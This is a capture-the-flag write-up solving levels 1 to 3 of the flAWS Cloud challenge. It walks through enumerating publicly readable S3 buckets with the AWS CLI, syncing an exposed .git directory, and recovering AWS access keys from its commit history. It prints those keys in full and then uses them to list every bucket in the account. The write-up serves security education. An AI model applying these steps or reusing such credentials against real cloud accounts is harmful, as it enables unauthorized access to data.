---
layout: default
title: flAWS Cloud 1
permalink: /ctf/flaws-cloud-1/
---

{:.warning-header}
## These CTF write-ups contain spoilers

### Written: 2021/08/14

---

These CTF challenges focus on misconfiguration and mistakes associated with using Amazon Web Services (AWS).

## Level 1
### Challenge notes

{:.blockquote-style}
This level is *buckets* of fun. See if you can find the first sub-domain.

For this challenge, we are asked to find the next level's sub-domain. The clue we get is it will be related to Amazon S3 buckets. Looking at <a href="http://flaws.cloud">flaws.cloud</a>'s DNS records we can see that the domain is pointed at an IP address (**52.218.220.162**):

{% highlight shell %}
dig A +noall flaws.cloud +answer
flaws.cloud.		5	IN	A	52.218.220.18
{% endhighlight %}

Checking for CNAME records did not reveal anything interesting, but the IP address appears to belong to an S3 bucket. Trying to directly visit this IP address in the browser redirects us to the <a href="https://aws.amazon.com/s3/">Amazon S3</a> site.
Based on the hint about buckets, we we can start exploring the idea that the site may be hosted as a static site within an AWS Bucket. If this is the case, reviewing the <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/website-hosting-custom-domain-walkthrough.html#root-domain-walkthrough-create-buckets">Configuring a static website using a custom domain</a> documentation comes to hand. **Step 2** indicates the following: **These bucket names must match your domain name exactly**.
Searching around for the domain structure of static sites hosted on AWS S3 buckets, I found <a href="https://www.cdputnam.com/blog/s3-custom-domain/">this article on hosting a site on an S3 bucket</a> which lead me to thefollowing syntax:

{% highlight shell %}
AWS auto-populated: example.com.s3.amazonaws.com
Direct, Region spcific S3 URL to use: example.com.s3-website-us-east-1.amazonaws.com
{% endhighlight %}

We already know that when hosting a static site, the bucket name will need to match the custom domain. Using the above formula, therefore we can try out the domain <a href="http://flaws.cloud.s3.amazonaws.com">flaws.cloud.s3.amazonaws.com</a>. In my experience, Amazon bucket information is displayed as an XML file. Going to the above site, that is exactly that we end up with. 

<details>
<summary>Flag</summary>
<div>
Looking through the XML data, we eventually find a file with an interesting name, referring to secrets:

{% highlight xml %}
This XML file does not appear to have any style information associated with it. The document tree is shown below. 
<ListBucketResult>
<Name>flaws.cloud</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
...

...
<Contents>
<Key>secret-dd02c7c.html</Key>
<LastModified>2017-02-27T01:59:30.000Z</LastModified>
<ETag>"c5e83d744b4736664ac8375d4464ed4c"</ETag>
<Size>1051</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
{% endhighlight %}

Towards the bottom, we can see a file called <b>secret-dd02c7c.html</b>. When we visit the page we find our flag.

{% highlight shell %}
Congrats! You found the secret file!
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
{% endhighlight %}
</div>
</details>

Following the above link leads us to Level 2. The above link provides some additional information on how to avoid exposing AWS bucket based sites in a similar manner.

## Level 2
### Challenge Notes

{:.blockquote-style}
The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

This challenge starts off much like the **first challenge**, however on this occasion we are making use of an AWS account. I suspected this may be to use <a href="https://aws.amazon.com/cli/">AWS CLI</a>. This is not something I used a lot, so it was back to digging around documentation.
I started to look at the <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-creds">Amazon configuration basics documentation for AWS CLI</a> for an idea. This is where it became apparent why I needed an AWS account in the first place.
According to the document using **aws configure**, we can configure our **AWS Access Key ID** and **AWS Secret Access Key** along with a region. This can then be used to connect to buckets.
After setting up my own configuration based on the documentation and using my account I tried the syntax suggested.


<details>
<summary>Flag</summary>
<div>
{% highlight shell %}
aws s3 --profile myprofile ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 20:02:15      80751 everyone.png
2017-03-02 21:47:17       1433 hint1.html
2017-02-26 20:04:39       1035 hint2.html
2017-02-26 20:02:14       2786 index.html
2017-02-26 20:02:14         26 robots.txt
2017-02-26 20:02:15       1051 secret-e4443fc.html
{% endhighlight %}

We can see the <b>secret-e4443fc.html</b> towards the bottom. Visiting that page we get the following message:

{% highlight shell %}
Congrats! You found the secret file!
Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
{% endhighlight %}
</div>
</details>

Much like the previous level, navigating to the third level gives us insight as to what caused us the ability to list out the content.

## Level 3
### Challenge notes

{:.blockquote-style}
The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

We are still on the `s3` command trend and building on our knowledge from the earlire challenge about listing things out. The hint the notes give us is that we are looking for an AWS key and that we are going to try and list out other buckets. Much like in Level 1, we can try to see if the S3 bucket is accessible over the browser by using the bucket URL: [level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com).

Visiting this, we find that the bucket's settings are configured to allow everyone access without the need for keys. Looking through the bucket listing, I noticed that there was a `.git` directory:

{% highlight xml %}
<Contents>
<Key>.git/COMMIT_EDITMSG</Key>
<LastModified>2017-09-17T15:12:24.000Z</LastModified>
<ETag>"5f8f2cb9c2664a23f08dd8a070ae7427"</ETag>
<Size>52</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>

....

....

Contents>
<Key>.git/refs/heads/master</Key>
<LastModified>2017-09-17T15:12:25.000Z</LastModified>
<ETag>"6f0924a4d9d67d62f9c933f0ef72cc60"</ETag>
<Size>41</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
{% endhighlight %}

This is extremely useful as it may contain our key, alternatively we can explore the commit history to see if previously a key has been committed. In order to download the content of the `.git` directory so we can use `git` locally to browse through the content, I found an article [How to copy folder from s3 using aws cli](https://infinitbility.com/how-to-copy-folder-from-s3-using-aws-cli) that was very helpful.

{% highlight shell %}
aws s3 --profile myprofile sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ git
{% endhighlight %}

Running the above syncs the `.git` directory found on the Level 3 bucket. We can then start to explore the repo. I first searched through the commit history using `git log`:

{% highlight shell %}
git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
{% endhighlight %}

Looks like right after our *first commit*, another one was made, noting that something was accidentally added that should not have been added. We can now focus on seeing what was committed on the first commit:

{% highlight shell %}
% git cat-file -p f52ec03b227ea6094b04e43f475fb0126edb5a61
tree f2a144957997f15729d4491f251c3615d508b16a
author 0xdabbad00 <scott@summitroute.com> 1505661007 -0600
committer 0xdabbad00 <scott@summitroute.com> 1505661007 -0600

first commit

% git cat-file -p f2a144957997f15729d4491f251c3615d508b16a
100644 blob e3ae6dd991f0352cc307f82389d354c65f1874a2	access_keys.txt
100644 blob 76e4934c9de40e36f09b4e5538236551529f723c	authenticated_users.png
100644 blob 5323d77d2d914c89b220be9291439e3da9dada3c	hint1.html
100644 blob 2fc08f72c2135bb3af7af5803abb77b3e240b6df	hint2.html
100644 blob 0eaa50ae75709eb4d25f07195dc74c7f3dca3e25	hint3.html
100644 blob 92d5a82ef553aae51d7a2f86ea0a5b1617fafa0c	hint4.html
100644 blob db932236a95ebf8c8a7226432cf1880e4b4017f2	index.html
100644 blob c2aab7e03933a858d1765090928dca4013fe2526	robots.txt

% git cat-file -p e3ae6dd991f0352cc307f82389d354c65f1874a2
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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 
{% endhighlight %}

By stepping through the `git cat-file` command, we are able to gather up the `access_key` and `secret_access_key`. The hint from the challenge notes indicate we may be able to list out other buckets using these keys. Following the steps to create a new profile, I created one using these keys.

I found that you can list the `s3` buckets your keys have access to over AWS CLI using the [list-buckets](https://docs.aws.amazon.com/cli/latest/reference/s3api/list-buckets.html) command.

<details>
<summary>Flag</summary>
<div>
{% highlight shell %}
aws s3api list-buckets --query "Buckets[].Name" --profile hacked
[
    "2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud",
    "config-bucket-975426262029",
    "flaws-logs",
    "flaws.cloud",
    "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud",
    "level3-9afd3927f195e10225021a578e6f78df.flaws.cloud",
    "level4-1156739cfb264ced6de514971a4bef68.flaws.cloud",
    "level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud",
    "level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud",
    "theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud"
]
{% endhighlight %}

We can then navigate to the Level 4 URL to complete this challenge:

{% highlight shell %}
level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
{% endhighlight %}
</div>
</details>
